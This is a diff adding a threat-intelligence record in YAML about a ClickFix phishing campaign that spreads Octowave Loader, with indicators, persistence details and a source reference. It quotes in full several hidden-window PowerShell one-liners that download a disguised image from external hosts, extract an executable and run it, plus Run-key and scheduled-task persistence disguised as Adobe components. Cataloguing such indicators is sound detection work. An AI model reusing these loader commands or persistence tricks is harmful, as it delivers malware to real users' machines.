@@ -1,0 +1,59 @@
+description: "ClickFix campaigns target Russian users via phishing PDFs that trigger\
+  \ PowerShell downloads of Octowave Loader DLL side\u2011loading."
+attribution: "Unknown threat actor, likely a state\u2011backed group operating in\
+  \ Russia"
+malware_families:
+- Octowave Loader
+TTPs:
+  processes: []
+  commandline:
+  - powershell -nop -w Hidden -c "$b=(iwr 'i.imghippo[.]com/files/wN1688B.png').Content;function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..(241+31261183)]);saps
+    (q 124 12) -a (q 169 51)"
+  - powershell -nop -w Hidden -c "$b=(New-Object System.Net.WebClient).DownloadData('hxxp://docrf[.]org:7891/yandex.png');function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..11150064]);saps
+    (q 124 12) -a (q 169 51)"
+  - powershell -nop -w Hidden -c "$b=(iwr 'i.imghippo[.]com/files/SS4638dPY.png').Content;function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..(241+11149823)]);saps
+    (q 124 12) -a (q 169 51)"
+  - '%WINDIR%\System32\WindowsPowershell\v0\powershell.exe -NoLogo -NoProfile -Command
+    <command>'
+  powershell:
+  - $b=(iwr 'i.imghippo[.]com/files/wN1688B.png').Content;function q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q
+    56 40),$b[241..(241+31261183)]);saps (q 124 12) -a (q 169 51)
+  - $b=(New-Object System.Net.WebClient).DownloadData('hxxp://docrf[.]org:7891/yandex.png');function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..11150064]);saps
+    (q 124 12) -a (q 169 51)
+  - $b=(iwr 'i.imghippo[.]com/files/SS4638dPY.png').Content;function q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q
+    56 40),$b[241..(241+11149823)]);saps (q 124 12) -a (q 169 51)
+  scripting_engine: []
+  registry_keys:
+  - HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Adobe Printer Driver
+    = "%LOCALAPPDATA%\Programs\Adobe Printer Driver\AGF3DPrinterDriver.exe"
+  - HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Adobe Sync Pro
+    = "%LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\CoreSync.exe"
+  image_load: []
+  network_connections:
+  - process: powershell
+    destination: hxxp://82.117.87[.]103/q?=furries
+    port: 80
+  file_activity:
+  - '%LOCALAPPDATA%\Programs\Adobe Printer Driver\Galleries\Achievement.db'
+  - '%LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\Analysis.db'
+  persistence:
+  - Run registry key under HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run
+  - Scheduled task Adobe Printer Driver launching AGF3DPrinterDriver.exe at logon
+  - Scheduled task Adobe Sync Pro launching CoreSync.exe at logon
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 82.117.87[.]103
+  domains:
+  - i.imghippo[.]com
+  - docrf[.]org
+  urls:
+  - hxxp://82.117.87[.]103/q?=furries
+reference: https://bi.zone/eng/expertise/blog/proydite-proverku-i-poluchite-vpo-clickfix-dobralas-do-rossii/
+date_of_publication: June 26, 2025
+file_creation_date: August 26, 2025
